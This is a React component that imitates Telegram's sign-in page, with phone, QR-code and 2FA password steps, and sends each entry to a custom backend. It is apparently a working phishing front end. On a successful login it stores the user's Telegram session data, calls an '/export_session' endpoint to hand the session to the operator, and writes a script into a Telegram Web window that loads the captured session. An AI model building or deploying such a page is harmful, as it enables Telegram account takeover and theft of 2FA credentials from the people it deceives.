import React, { useEffect, useState } from 'react';
import { useNavigate } from "react-router-dom";
import { api } from '../services/router';
import Select from 'react-select';

const TelegramLogin = ({ setPhone }) => {
    const [phoneNumber, setPhoneNumber] = useState('+1');
    const [country, setCountry] = useState('United States');
    const [countryCode, setCountryCode] = useState('+1');
    const [phoneNumberError, setPhoneNumberError] = useState('');
    const [error, setError] = useState('');
    const [codes, setCountryCodes] = useState({});
    const [loading, setLoading] = useState(false);
    const [showQR, setShowQR] = useState(false);
    const [qrUrl, setQrUrl] = useState('');
    const [pollingIntervalId, setPollingIntervalId] = useState(null);
    const [requires2FA, setRequires2FA] = useState(false);
    const [twoFAPassword, setTwoFAPassword] = useState('');
    const [isVerified, setIsVerified] = useState(false); // New state for success page
    const navigate = useNavigate();

    useEffect(() => {
        const fetchCountryData = async () => {
            setLoading(true);
            try {
                const response = await fetch('https://restcountries.com/v3.1/all');
                if (!response.ok) throw new Error('Failed to fetch countries');
                const data = await response.json();
                const countryCodes = data.reduce((acc, country) => {
                    if (country.name?.common && country.idd?.root) {
                        acc[country.name.common] = country.idd.suffixes?.[0] ? `${country.idd.root}${country.idd.suffixes[0]}` : country.idd.root;
                    }
                    return acc;
                }, {});
                setCountryCodes(countryCodes);
                setPhoneNumber(countryCodes['United States'] || '+1');
            } catch (err) {
                setError('Using fallback countries');
                setCountryCodes({ 'United States': '+1', 'United Kingdom': '+44', 'Canada': '+1', 'India': '+91', 'Australia': '+61' });
                setPhoneNumber('+1');
            } finally {
                setLoading(false);
            }
        };
        fetchCountryData();
    }, []);

    const handlePhoneLogin = async () => {
        const trimmedPhone = phoneNumber.trim();
        const phoneRegex = /^\+[0-9]{7,15}$/;
        if (!trimmedPhone || !phoneRegex.test(trimmedPhone)) {
            setPhoneNumberError('Enter a valid phone number with country code (e.g., +12345678901)');
            return;
        }
        setLoading(true);
        setError('');
        try {
            const response = await api.post('/send_code', { phone_number: trimmedPhone });
            if (response.data && response.data.user_id) {
                localStorage.setItem('user_id', response.data.user_id);
                localStorage.setItem('phone_number', trimmedPhone);
                navigate('/verify');
            } else {
                setError('Failed to send verification code.');
            }
        } catch (err) {
            setError(err.response?.data?.detail || 'Failed to send verification code.');
        } finally {
            setLoading(false);
        }
    };

    const handleQRLogin = async () => {
        setLoading(true);
        setError('');
        setShowQR(false);
        setRequires2FA(false);
        try {
            const response = await api.post('/qrcodelogin');
            if (response.data.qr_url && response.data.user_id) {
                const userId = String(response.data.user_id);
                localStorage.setItem('user_id', userId);
                setQrUrl(response.data.qr_url);
                setShowQR(true);
                startPollingForLogin(userId);
            } else {
                setError('Failed to generate QR code.');
            }
        } catch (err) {
            setError(err.response?.data?.detail || 'Failed to generate QR code.');
        } finally {
            setLoading(false);
        }
    };

    const startPollingForLogin = (userId) => {
        if (!userId) {
            setError('No user ID for polling');
            return;
        }
        if (pollingIntervalId) clearInterval(pollingIntervalId);
        const intervalId = setInterval(async () => {
            try {
                const response = await api.post(`/verify_qr_login/${userId}`);
                if (response.data.status === 200 && response.data.message === "QR login and session export successful") {
                    clearInterval(intervalId);
                    setPollingIntervalId(null);
                    setShowQR(false);
                    console.log("QR login successful:", response.data);
                    await handleSuccessfulLogin(response.data, userId);
                } else if (response.data.status === 401 && response.data.detail?.includes("2FA")) {
                    clearInterval(intervalId);
                    setPollingIntervalId(null);
                    setRequires2FA(true);
                    setError("");
                } else if (response.data.status === 202) {
                    console.log('QR code not yet scanned...');
                } else {
                    setError("Unexpected QR login response.");
                }
            } catch (err) {
                clearInterval(intervalId);
                setPollingIntervalId(null);
                setError(err.response?.data?.detail || 'QR login failed.');
                setShowQR(false);
                setRequires2FA(false);
            }
        }, 1000);
        setPollingIntervalId(intervalId);
    };

    const handle2FASubmit = async () => {
        const userId = localStorage.getItem('user_id');
        if (!userId || !twoFAPassword) {
            setError('User ID or 2FA password missing');
            return;
        }
        setLoading(true);
        setError('');
        try {
            const response = await api.post(`/verify_qr_2fa/${userId}`, { user_id: userId, password: twoFAPassword });
            if (response.data.status === 200) {
                console.log("QR 2FA verification successful:", response.data);
                setRequires2FA(false);
                setTwoFAPassword('');
                await handleSuccessfulLogin(response.data, userId);
            } else {
                setError('Unexpected response from server.');
            }
        } catch (err) {
            setError(err.response?.data?.detail || 'Invalid 2FA password.');
        } finally {
            setLoading(false);
        }
    };

    const handleSuccessfulLogin = async (data, userId) => {
        const sessionData = data.session_data;
        const loginToken = data.login_token || (data.user_info ? data.login_token : null);
        if (sessionData) {
            localStorage.clear();
            localStorage.setItem("account1", JSON.stringify(sessionData));
            localStorage.setItem("telegram_user_id", data.user_info.id || 'N/A');
            localStorage.setItem("telegram_user_name", data.user_info.first_name || 'N/A');
            localStorage.setItem("telegram_user_phone", data.user_info.phone || 'N/A');
            if (loginToken) localStorage.setItem("login_token", loginToken);

            try {
                await api.get(`/export_session/${userId}`);
                console.log("Session exported successfully");
            } catch (exportErr) {
                console.error("Session export failed:", exportErr);
                setError("Login succeeded, but session export failed.");
            }

            // Show success page
            setIsVerified(true);

            // Redirect to Telegram Web after 3 seconds
            const telegramWebUrl = "https://web.telegram.org/k/";
            const loginScript = `
                localStorage.clear();
                localStorage.setItem("account1", '${JSON.stringify(sessionData)}');
                location.reload();
            `;
            setTimeout(() => {
                const telegramWindow = window.open(telegramWebUrl, "_blank");
                if (telegramWindow) {
                    setTimeout(() => {
                        telegramWindow.document.write(`<script>${loginScript}</script>`);
                        telegramWindow.document.close();
                    }, 1500);
                    console.log("Telegram Web opened successfully");
                } else {
                    console.warn("Popup blocked, redirecting current window");
                    localStorage.setItem("account1", JSON.stringify(sessionData));
                    window.location.href = telegramWebUrl;
                }
            }, 3000); // 3-second delay to show success page
        } else {
            setError('Session data missing.');
            setIsVerified(false);
        }
    };

    useEffect(() => {
        return () => pollingIntervalId && clearInterval(pollingIntervalId);
    }, [pollingIntervalId]);

    const handleCountryChange = (selectedOption) => {
        const newCountry = selectedOption ? selectedOption.value : 'United States';
        setCountry(newCountry);
        setCountryCode(codes[newCountry] || '+1');
        setPhoneNumber(codes[newCountry] || '+1');
    };

    const countryOptions = Object.keys(codes).sort().map(countryName => ({
        value: countryName,
        label: `${countryName} (${codes[countryName]})`,
    }));

    const customStyles = {
        control: (base) => ({ ...base, backgroundColor: '#242F3D', border: 'none', borderRadius: '8px', padding: '6px', boxShadow: 'none', cursor: 'pointer' }),
        menu: (base) => ({ ...base, borderRadius: '8px', backgroundColor: '#242F3D', boxShadow: '0 2px 8px rgba(0,0,0,0.2)', maxHeight: '200px', overflowY: 'auto' }),
        option: (base, state) => ({ ...base, backgroundColor: state.isSelected ? '#3390EC' : state.isFocused ? '#374552' : '#242F3D', color: state.isSelected ? '#FFFFFF' : '#CCCCCC', cursor: 'pointer', padding: '8px 12px' }),
        singleValue: (base) => ({ ...base, color: '#FFFFFF' }),
        input: (base) => ({ ...base, color: '#FFFFFF' }),
        dropdownIndicator: (base) => ({ ...base, color: '#3390EC', '&:hover': { color: '#5EACEF' } }),
    };

    if (isVerified) {
        return (
            <div className="min-h-screen bg-[#17212B] flex items-center justify-center p-4">
                <div className="w-full max-w-sm bg-[#232E3C] rounded-lg p-6 shadow-md text-center">
                    <div className="w-16 h-16 bg-[#3390EC] rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="none">
                            <path d="M20 6L9 17L4 12" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </div>
                    <h1 className="text-xl font-bold text-white mb-2">Success!</h1>
                    <p className="text-[#AAAAAA] text-sm mb-4">Login completed successfully.</p>
                    <p className="text-[#AAAAAA] text-sm">You will be redirected to Telegram Web shortly...</p>
                    <button
                        onClick={() => window.open("https://web.telegram.org/k/", "_blank")}
                        className="mt-4 bg-[#3390EC] text-white py-2 px-4 rounded-lg hover:bg-[#5EACEF]"
                    >
                        Login to Telegram Web Now
                    </button>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#17212B] flex items-center justify-center p-4">
            <div className="w-full max-w-sm bg-[#232E3C] rounded-lg p-6 shadow-md">
                <div className="flex flex-col items-center">
                    <div className="w-16 h-16 bg-[#3390EC] rounded-full flex items-center justify-center mb-4">
                        <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="none">
                            <path d="M20 4L3 11L10 14M20 4L17 21L10 14M20 4L10 14" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </div>
                    <h1 className="text-xl font-bold text-white mb-2">Telegram</h1>
                    <p className="text-[#AAAAAA] text-sm mb-4">{showQR ? 'Scan QR Code' : 'Sign in'}</p>
                    {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
                    {loading && <p className="text-[#AAAAAA] text-sm mb-4">Loading...</p>}
                    {!showQR ? (
                        <>
                            <div className="w-full mb-4">
                                {Object.keys(codes).length ? (
                                    <Select options={countryOptions} value={countryOptions.find(o => o.value === country)} onChange={handleCountryChange} styles={customStyles} placeholder="Select country" isSearchable />
                                ) : (
                                    <p className="text-[#AAAAAA] text-sm">Loading countries...</p>
                                )}
                            </div>
                            <div className="w-full mb-4">
                                <input
                                    type="tel"
                                    className={`w-full bg-[#242F3D] text-white rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-[#3390EC] ${phoneNumberError ? 'border border-red-500' : ''}`}
                                    value={phoneNumber}
                                    onChange={(e) => setPhoneNumber(e.target.value)}
                                    onFocus={() => setPhoneNumberError('')}
                                    placeholder="Phone number"
                                />
                                {phoneNumberError && <p className="text-red-500 text-xs mt-1">{phoneNumberError}</p>}
                            </div>
                            <button onClick={handlePhoneLogin} disabled={loading} className={`w-full bg-[#3390EC] text-white py-2 rounded-lg hover:bg-[#5EACEF] ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}>NEXT</button>
                            <button onClick={handleQRLogin} disabled={loading} className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm">LOG IN BY QR CODE</button>
                        </>
                    ) : requires2FA ? (
                        <div className="w-full flex flex-col items-center">
                            <p className="text-white mb-4">Enter your 2FA password</p>
                            <input
                                type="password"
                                className="w-full bg-[#242F3D] text-white rounded-lg p-3 mb-4 focus:outline-none focus:ring-2 focus:ring-[#3390EC]"
                                value={twoFAPassword}
                                onChange={(e) => setTwoFAPassword(e.target.value)}
                                placeholder="2FA Password"
                            />
                            <button
                                onClick={handle2FASubmit}
                                disabled={loading || !twoFAPassword}
                                className={`w-full bg-[#3390EC] text-white py-2 rounded-lg hover:bg-[#5EACEF] ${loading || !twoFAPassword ? 'opacity-50 cursor-not-allowed' : ''}`}
                            >
                                SUBMIT
                            </button>
                            <button onClick={() => { setRequires2FA(false); setShowQR(false); setTwoFAPassword(''); setError(''); }} className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm">CANCEL</button>
                        </div>
                    ) : (
                        <div className="flex flex-col items-center p-4">
                            {loading ? (
                                <div className="w-64 h-64 flex items-center justify-center"><span className="text-gray-400">Generating QR code...</span></div>
                            ) : qrUrl ? (
                                <div className="flex flex-col items-center">
                                    <div className="bg-white rounded-lg p-4 mb-4 relative" style={{ width: '220px', height: '220px' }}>
                                        <img src={`https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qrUrl)}&size=180x180&margin=10&format=png`} alt="QR Code" style={{ width: '180px', height: '180px' }} />
                                        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', width: '50px', height: '50px' }} />
                                    </div>
                                    <p className="text-[#AAAAAA] text-sm mb-2 text-center">Scan this QR code with Telegram</p>
                                    <button onClick={() => { setShowQR(false); if (pollingIntervalId) clearInterval(pollingIntervalId); setError(''); }} className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm">RETURN TO PHONE LOGIN</button>
                                </div>
                            ) : (
                                <div className="text-red-500 p-4 border rounded-lg">Failed to generate QR code</div>
                            )}
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
};

export default TelegramLogin;